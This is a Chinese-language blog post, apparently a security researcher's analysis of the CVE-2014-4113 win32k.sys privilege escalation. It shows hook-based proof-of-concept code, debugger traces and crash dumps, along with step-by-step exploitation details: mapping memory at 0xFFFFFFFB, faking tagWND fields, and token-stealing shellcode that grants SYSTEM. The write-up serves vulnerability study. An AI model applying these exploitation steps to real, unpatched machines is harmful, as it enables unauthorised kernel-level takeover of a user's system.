<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.4.0 -->
    <script>window.materialVersion = "1.4.0"</script>

    <!-- Title -->
    
    <title>
        
            CVE-2014-4113 漏洞利用分析 | 
        
        b2ahex&#39;s blog
    </title>

    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">
    
    
    
    
    
        <link rel="dns-prefetch" href="https://www.google-analytics.com"/>
    
    
    
    
    
    

    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#0097A7">
    <meta name="author" content="b2ahex">
    <meta name="description" itemprop="description" content="作者：b2ahex
1. 背景介绍
win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
">
    <meta name="keywords" content="null">

    <!-- Site Verification -->
    
    

    <!-- Favicons -->

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) 
{
    CWPSTRUCT *ptag = (CWPSTRUCT*)lParam;
    if (ptag-&gt;message == 0x1eb) 
    {
        SetWindowLongPtr(ptag-&gt;hwnd, GWLP_WNDPROC, (LONG_PTR)NewMenuProc); //替换菜单窗口过程，等会儿win32k会对菜单窗口发消息
    }
    return CallNextHookEx(0, code, wParam, lParam);
}

    SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId()); //设置hook域
</code></pre><p>将程序放进虚拟机，下断点:</p>
<pre><code>ba e1 win32k!xxxHandleMenuMessages+0x6ac &quot;.if @ecx = 0x204 {.echo ########## WM_RBUTTONDOWN #########} .else{gc}&quot;  
</code></pre><p>运行程序后，右键点击菜单窗口，成功断下:</p>
<pre><code>kd&gt; g
########## WM_RBUTTONDOWN #########
win32k!xxxHandleMenuMessages+0x6ac:
fffff960`001a1fbc 81e903020000    sub     ecx,203h
</code></pre><p>接着下断点检查 win32k!xxxSendMessageTimeout 返回值:</p>
<pre><code>ba e1 win32k!xxxMNFindWindowFromPoint+0xa2  

kd&gt; g
win32k!xxxMNFindWindowFromPoint+0xa2:
fffff960`00162ab2 488bd8          mov     rbx,rax
kd&gt; r rax
rax=00000000fffffffb
</code></pre><p>再次运行后，系统崩溃:  </p>
<pre><code>FAULTING_IP: 
win32k!xxxSendMessageTimeout+136
fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h]

CONTEXT:  fffff88004c58d00 -- (.cxr 0xfffff88004c58d00)
rax=00000000fffffe0d rbx=0000000000000000 rcx=00000000fffffffb
rdx=fffff900c2eefc30 rsi=00000000000001ed rdi=0000000000000000
rip=fffff9600010a46a rsp=fffff88004c596e0 rbp=00000000fffffffb
 r8=000000000018f7f8  r9=0000000000000000 r10=fffff900c2eefc30
r11=fffff88004c596c0 r12=0000000000000000 r13=0000000000000000
r14=000000000018f7f8 r15=0000000000000000
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
win32k!xxxSendMessageTimeout+0x136:
fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h] ss:0018:00000001`0000000b=????????????????
</code></pre><p>poc : <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/poc.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/poc.cpp</a></p>
<h3 id="4-EXPLOIT"><a href="#4-EXPLOIT" class="headerlink" title="4. EXPLOIT"></a>4. EXPLOIT</h3><p>在分析过 <em>win32k!xxxSendMessageTimeout</em> 之后，可以注意到窗口过程函数除了运行在用户层之外，如果含有 bServerSideWindowProc， win32k模块会直接调用它的窗口过程函数.</p>
<pre><code>if (ptagWND-&gt;bServerSideWindowProc)       //检查当前窗口对象的 bServerSideWindowProc 标志位
    {
      ......
      LODWORD(v13) = ptagwnd-&gt;lpfnWndProc(ptagwnd, uMsg, v10, v9); //内核模式下执行 lpfnWndProc 窗口过程
    }
</code></pre><p>这里是一个可以被利用的地方，由于这个tagwnd对象的基址是我们通过漏洞构造的0x0`FFFFFFFB,lpfnWndProc 函数指针位于基址加偏移0x90的位置(win7x64下)，所以只要覆盖这个指针，让它指向shellcode地址(win7下不考虑SMAP/SMEP),那么在最后漏洞触发时就有可能实现r0运行r3代码。  </p>
<p>观察在上面给出的代码(上一节)，要在 <em>win32k!xxxSendMessageTimeout</em> 中直接运行用户层的shellcode主要有以下几个条件:  </p>
<ol>
<li>gptiCurrent == ptagWND-&gt;head-&gt;pti  </li>
<li>ptagWND-&gt;bServerSideWindowProc != 0  </li>
<li>ptagwnd-&gt;lpfnWndProc == shellcode</li>
</ol>
<p>当基址位于 0x0`FFFFFFFB 之后，计算他们的地址位于:  </p>
<pre><code>kd&gt; dt win32k!tagwnd /r
   +0x000 head             : _THRDESKHEAD
      +0x000 h                : Ptr64 Void
      +0x008 cLockObj         : Uint4B
      +0x010 pti              : Ptr64 tagTHREADINFO &lt;----- 0x0`FFFFFFFB + 0x10 == = 00000001`0000000b
      +0x018 rpdesk           : Ptr64 tagDESKTOP
      +0x020 pSelf            : Ptr64 UChar
   +0x028 state            : Uint4B
   +0x028 bHasMeun         : Pos 0, 1 Bit
   +0x028 bHasVerticalScrollbar : Pos 1, 1 Bit
   +0x028 bHasHorizontalScrollbar : Pos 2, 1 Bit
   +0x028 bHasCaption      : Pos 3, 1 Bit
   +0x028 bSendSizeMoveMsgs : Pos 4, 1 Bit
   +0x028 bMsgBox          : Pos 5, 1 Bit
   +0x028 bActiveFrame     : Pos 6, 1 Bit
   +0x028 bHasSPB          : Pos 7, 1 Bit
   +0x028 bNoNCPaint       : Pos 8, 1 Bit 
   +0x028 bSendEraseBackground : Pos 9, 1 Bit
   +0x028 bEraseBackground : Pos 10, 1 Bit
   +0x028 bSendNCPaint     : Pos 11, 1 Bit
   +0x028 bInternalPaint   : Pos 12, 1 Bit
   +0x028 bUpdateDirty     : Pos 13, 1 Bit
   +0x028 bHiddenPopup     : Pos 14, 1 Bit
   +0x028 bForceMenuDraw   : Pos 15, 1 Bit
   +0x028 bDialogWindow    : Pos 16, 1 Bit
   +0x028 bHasCreatestructName : Pos 17, 1 Bit
   +0x028 bServerSideWindowProc : Pos 18, 1 Bit  &lt;----- 0x0`FFFFFFFB + 0x28 + 2 == 00000001`00000025
   ................................
   +0x090 lpfnWndProc      : Ptr64        int64  &lt;----- 0x0`FFFFFFFB + 0x90 == 00000001`0000008b
</code></pre><p>可以看到，在上面的poc中，引发BSOD正是因为在比较pti时，由于内存异常访问引发的</p>
<pre><code>win32k!xxxSendMessageTimeout+0x136:
fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h] ss:0018:00000001`0000000b=????????????????
</code></pre><p>现在，为了利用这个漏洞，需要通过 <em>ntdll</em> 模块中导出的 <em>NtAllocateVirtualMemory</em> 函数先申请 <em>0x00000000FFFFFFFB</em> 位置的内存，并且设置以下地址的数据:<br><strong>00000001`0000000b == pti</strong><br>pti 可以通过TEB结构获取，x64下用户层中，gs:[0x30] 指向TEB</p>
<pre><code>kd&gt; dt _teb
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x038 EnvironmentPointer : Ptr64 Void
   +0x040 ClientId         : _CLIENT_ID
   +0x050 ActiveRpcHandle  : Ptr64 Void
   +0x058 ThreadLocalStoragePointer : Ptr64 Void
   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB
   +0x068 LastErrorValue   : Uint4B
   +0x06c CountOfOwnedCriticalSections : Uint4B
   +0x070 CsrClientThread  : Ptr64 Void
   +0x078 Win32ThreadInfo  : Ptr64 Void         &lt;------ pti
   +0x080 User32Reserved   : [26] Uint4B
   +0x0e8 UserReserved     : [5] Uint4B
</code></pre><p><strong>00000001`00000025 == 00000100B == 04H</strong><br>bServerSideWindowProc标志位，表示tagwnd对象的窗口过程能否运行在内核中，这里是固定的就可以了</p>
<p><strong>00000001`0000008b == shellcode地址</strong><br>关于shellcode 这里就简单的使用system token替换的方式给当前进程提升权限，主要步骤包括：<br>a.得到当前进程的 <em>EPROCESS</em> 对象(x64下，gs指向kpcr)，参考函数 <em>PsGetCurrentProcess</em></p>
<pre><code>kd&gt; u PsGetCurrentProcess
nt!PsGetCurrentProcess:
fffff800`028afbd0 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`028afbd9 488b4070        mov     rax,qword ptr [rax+70h]
fffff800`028afbdd c3              ret
</code></pre><p>b.从 ActiveProcessLinks 中找到进程id是4的system进程.<br>c.将system进程的token替换到当前进程</p>
<p>更新代码后，运行程序，鼠标放在第一个菜单窗口，当第二个窗口弹出来后，点击窗口，最终由win32k模块直接执行shellcode:</p>
<pre><code>win32k!xxxSendMessageTimeout+0x26f:
fffff960`0016a5a3 ff9590000000    call    qword ptr [rbp+90h] ss:0018:00000001`0000008b=00000000ffff0000
kd&gt; u poi(rbp+90)
